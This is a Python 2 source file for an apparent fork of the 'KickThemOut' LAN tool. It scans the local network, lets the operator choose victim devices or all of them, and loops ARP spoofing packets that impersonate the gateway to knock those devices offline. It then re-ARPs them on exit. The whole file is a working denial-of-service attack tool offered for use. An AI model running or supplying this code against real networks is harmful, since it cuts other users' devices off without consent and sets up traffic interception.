#!/usr/bin/env python
# -.- coding: utf-8 -.-
# kickthemout.py
# authors: k4m4, xdavidhu, kkevsterrr

"""
Based on KickThemOut by Nikolaos Kamarinakis (nikolaskam@gmail.com) & David Schütz (xdavid@protonmail.com)
"""

import time, os, sys, logging, math
from time import sleep
import netifaces as ni
import urllib2 as urllib
BLUE, RED, WHITE, YELLOW, MAGENTA, GREEN, END = '\33[94m', '\033[91m', '\33[97m', '\33[93m', '\033[1;35m', '\033[1;32m', '\033[0m'

notRoot = False
try:
    if os.geteuid() != 0:
        print("\n{0}ERROR: KickThemOff must run as root. Try again with sudo/root:\n\t{1}$ sudo python kickthemoff.py{2}\n").format(RED, GREEN, END)
        notRoot = True
except:
    # User is probably on windows
    pass
if notRoot:
    raise SystemExit

logging.getLogger("scapy.runtime").setLevel(logging.ERROR)  # Shut up scapy!
try:
    from scapy.all import *
    import scan, spoof
except:
    print("\n{0}ERROR: Requirements have not been properly satisfied. Please try running:\n\t{1}$ sudo pip install -r requirements.txt{2}").format(RED, GREEN, END)
    print("\n{0}If you still get the same error, please submit an issue here:\n\t{1}https://github.com/k4m4/kickthemout/issues\n{2}").format(RED, BLUE, END)
    raise SystemExit

def heading():
    sys.stdout.write(GREEN + """
    █  █▀ ▄█ ▄█▄    █  █▀    ▄▄▄▄▀  ▄  █ ▄███▄   █▀▄▀█  ████▄   ▄      ▄▄▄▄▀
    █▄█   ██ █▀ ▀▄  █▄█   ▀▀▀ █    █   █ █▀   ▀  █ █ █  █   █    █  ▀▀▀ █
    █▀▄   ██ █   ▀  █▀▄       █    ██▀▀█ ██▄▄    █ ▄ █  █   █ █   █     █
    █  █  ▐█ █▄  ▄▀ █  █     █     █   █ █▄   ▄▀ █   █  ▀████ █   █    █
     █    ▐ ▀███▀    █     ▀         █  ▀███▀      █         █▄ ▄█   ▀
     ▀               ▀               ▀             ▀           ▀▀▀
    """ + END + BLUE +
    '\n' + '{0}Kick Devices Off Your LAN ({1}KickThemOff{2}){3}'.format(YELLOW, RED, YELLOW, BLUE).center(98) +
    '\n' + 'Version: {0}1.0{1}\n'.format(YELLOW, END).center(86))

def changeSettings():
    global APPLE_DIG_ENABLED
    while True:
        print('\n\t{0}[{1}1{2}]{3} Change Interface').format(YELLOW, RED, YELLOW, WHITE)
        sleep(0.1)
        status = "Enable" if not APPLE_DIG_ENABLED else "Disable"
        print('\n\t{0}[{1}2{2}]{3} '+status+' Apple Device Name Dig').format(YELLOW, RED, YELLOW, WHITE)
        sleep(0.1)
        print('\n\t{0}[{1}3{2}]{3} Return to menu\n').format(YELLOW, RED, YELLOW, WHITE)
        sleep(0.1)
        header = ('{0}kickthemout{1}> {2}'.format(BLUE, WHITE, END))
        choice = raw_input(header)
        if choice == '1':
            changeInterface()
            break
        elif choice.upper() == '2':
            APPLE_DIG_ENABLED = not APPLE_DIG_ENABLED
            status = "disabled" if not APPLE_DIG_ENABLED else "enabled"
            print(GREEN+"\t[*] Apple dig "+status+"."+END)
            break
        elif choice == '3':
            return
def optionBanner():
    print('\nChoose option from menu:\n')
    sleep(0.1)
    print('\t{0}[{1}1{2}]{3} Initiate').format(YELLOW, RED, YELLOW, WHITE)
    sleep(0.1)
    print('\n\t{0}[{1}2{2}]{3} Change Settings').format(YELLOW, RED, YELLOW, WHITE)
    sleep(0.1)
    print('\n\t{0}[{1}E{2}]{3} Exit KickThemOut\n').format(YELLOW, RED, YELLOW, WHITE)

def changeInterface():
    global defaultInterface, defaultGatewayIP, defaultInterfaceMac
    sys.stdout.write(GREEN +"\nEnter a new interface to use: "+RED)
    iface = raw_input("")
    defaultInterface = iface
    print(GREEN+"New interface "+RED+iface+GREEN+" loaded.")
    defaultGatewayIP = getGatewayIP()
    defaultInterfaceMac = getDefaultInterfaceMAC()
    print_info()

def regenOnlineIPs():
    global onlineIPs
    global defaultGatewayMac
    onlineIPs = []
    for host in hostsList:
        onlineIPs.append(host[0])
        if host[0] == defaultGatewayIP:
            defaultGatewayMac = host[1]

def scanNetwork():
    global hostsList
    hostsList = scan.scanNetwork()
    regenOnlineIPs()

def print_online_ips():
    print("Online IPs: ")
    for i in range(len(onlineIPs)):
        mac = ""
        for host in hostsList:
            if host[0] == onlineIPs[i]:
                mac = host[1]
        vendor = resolveMac(mac)
        comp_name = " ("+get_apple_name(onlineIPs[i])+")" if vendor == "Apple, Inc." else ""
        print("  [{0}" + str(i) + "{1}] {2:5}" + str(onlineIPs[i]) + "{3:6}\t"+ vendor + "{4}"+comp_name).format(YELLOW, WHITE, RED, GREEN, END)

def build_targets(hosts_list):
    targets = {}
    for ip in hosts_list:
        for host in hostsList:
            if host[0] == ip:
                targets[ip] = host[1]
    return targets


def kicksomeoff():
    os.system("clear||cls")

    print("\n{0}Scanning for targets{1}...{2}\n").format(RED, GREEN, END)
    scanNetwork()
    
    print_online_ips()
   
    canBreak = False
    while not canBreak:
        try:
            choice = raw_input("\nEnter device numbers to target (comma-separated), a custom IP, or [a] to target all: ") 
            if re.match('\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}', choice) != None:
                targets={}
                result = sr1(ARP(op=ARP.who_has, psrc=getMyIP(), pdst=choice), timeout=5, verbose=False) 
                if not result:
                    print(RED+"ERROR: This address did not respond. (Is the IP address correct?)"+END)
                    continue
                mac = result.hwsrc
                targets[choice] = mac
                canBreak = True
            elif choice.upper() == "A" or choice.upper() == "ALL":
                targets = [host[0] for host in hostsList if host[0] != defaultGatewayIP]
                targets = build_targets(targets)
            elif ',' in choice:
                some_targets = choice.split(",") # TODO ERROR HANDLING
                canBreak = True
                targets = [onlineIPs[int(i)] for i in some_targets]
                targets = build_targets(targets)
            else:
                try:
                    int(choice)
                    targets = build_targets([onlineIPs[int(choice)]])
                    canBreak = True
                except:
                    print("{0}ERROR: Please enter a number.{1}\n").format(RED, END)
        except KeyboardInterrupt:
            return

    some_ipList = ""
    for ip in targets:
        some_ipList += GREEN + "'" + RED + ip + GREEN + "', "
    some_ipList = some_ipList[:-2] + END

    print("\n{0}Targets: {1}" + some_ipList).format(GREEN, END)
    print("\n{0}Spoofing started... {1}").format(GREEN, END)
    try:
        while True:
            for ip in targets:
                mac = targets[ip]
                spoof.sendPacket(defaultInterfaceMac, defaultGatewayIP, ip, mac)
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n{0}Re-arping{1} targets...{2}").format(RED, GREEN, END)
        reArp = 1
        while reArp != 10:
            for ip in targets:
                spoof.sendPacket(defaultGatewayMac, defaultGatewayIP, ip, targets[ip])
            reArp += 1
            time.sleep(0.5)
        print("{0}Re-arped{1} targets successfully.{2}").format(RED, GREEN, END)

def getDefaultInterface():
    def long2net(arg):
        if (arg <= 0 or arg >= 0xFFFFFFFF):
            raise ValueError("illegal netmask value", hex(arg))
        return 32 - int(round(math.log(0xFFFFFFFF - arg, 2)))
    def to_CIDR_notation(bytes_network, bytes_netmask):
        network = scapy.utils.ltoa(bytes_network)
        netmask = long2net(bytes_netmask)
        net = "%s/%s" % (network, netmask)
        if netmask < 16:
            return None
        return net
    for network, netmask, _, interface, address in scapy.config.conf.route.routes:
        if network == 0 or interface == 'lo' or address == '127.0.0.1' or address == '0.0.0.0':
            continue
        if netmask <= 0 or netmask == 0xFFFFFFFF:
            continue
        net = to_CIDR_notation(network, netmask)
        if interface != scapy.config.conf.iface:
            continue
        if net:
            return interface

def getGatewayIP():
    try:
        getGateway_p = ni.gateways()["default"][ni.AF_INET][0]
        return getGateway_p
    except:
        print("\n{0}ERROR: Gateway IP could not be obtained. Please enter IP manually.{1}\n").format(RED, END)
        header = ('{0}kickthemout{1}> {2}Enter Gateway IP {3}(e.g. 192.168.1.1): '.format(BLUE, WHITE, RED, END))
        gatewayIP = raw_input(header)
        return gatewayIP

def getDefaultInterfaceMAC():
    try:
        defaultInterfaceMac = get_if_hwaddr(defaultInterface)
	return defaultInterfaceMac
    except:
        print("\n{0}ERROR: Default Interface MAC Address could not be obtained. Please enter MAC manually.{1}\n").format(RED, END)
        header = ('{0}kickthemout{1}> {2}Enter MAC Address {3}(MM:MM:MM:SS:SS:SS): '.format(BLUE, WHITE, RED, END))
        defaultInterfaceMac = raw_input(header)
	return defaultInterfaceMac

def get_apple_name(ip):
    name = ""
    if APPLE_DIG_ENABLED:
        name, err = subprocess.Popen("dig +time=2 +tries=2 +short -x %s @224.0.0.251 -p 5353" % ip, shell=True, stdout=subprocess.PIPE).communicate()
    return name.strip()

def resolveMac(mac):
    try:
        url = "http://macvendors.co/api/vendorname/"
        request = urllib.Request(url + mac, headers={'User-Agent': "API Browser"})
        response = urllib.urlopen(request)
        vendor = response.read()
        vendor = vendor.decode("utf-8")
        vendor = vendor[:25]
        return vendor
    except:
        return "N/A"

def getMyIP():
    return ni.ifaddresses(defaultInterface)[ni.AF_INET][0]['addr']

def print_info():
    print("\n{0}Using interface '{1}" + defaultInterface + "{2}' ("+RED+myIP+GREEN+") with mac address '{3}" + defaultInterfaceMac + "{4}' to gateway '{5}"
        + defaultGatewayIP + "{6}'{9}").format(GREEN, RED, GREEN, RED, GREEN, RED, GREEN, RED, GREEN, END)


def main():
    global APPLE_DIG_ENABLED
    heading()
    print_info()

    try:
        while True:

            optionBanner()

            header = ('{0}kickthemout{1}> {2}'.format(BLUE, WHITE, END))
            choice = raw_input(header)

            if choice.upper() == 'E' or choice.upper() == 'EXIT':
                print('\n{0}Thanks for dropping by.'
                      '\nCatch ya later!{1}').format(GREEN, END)
                raise SystemExit
            elif choice == '2':
                changeSettings()
            elif choice == '1':
                kicksomeoff()
            elif choice.upper() == 'CLEAR':
                os.system("clear||cls")
            else:
                print("\n{0}ERROR: Please select a valid option.{1}\n").format(RED, END)

    except KeyboardInterrupt:
        print('\n\n{0}Thanks for dropping by.'
              '\nCatch ya later!{1}').format(GREEN, END)

if __name__ == '__main__':

    defaultInterface = getDefaultInterface()
    defaultGatewayIP = getGatewayIP()
    defaultInterfaceMac = getDefaultInterfaceMAC()
    APPLE_DIG_ENABLED = False
    myIP = getMyIP()
    #scanningThread = threading.Thread(target=scanNetwork)
    #scanningThread.start()

    main()
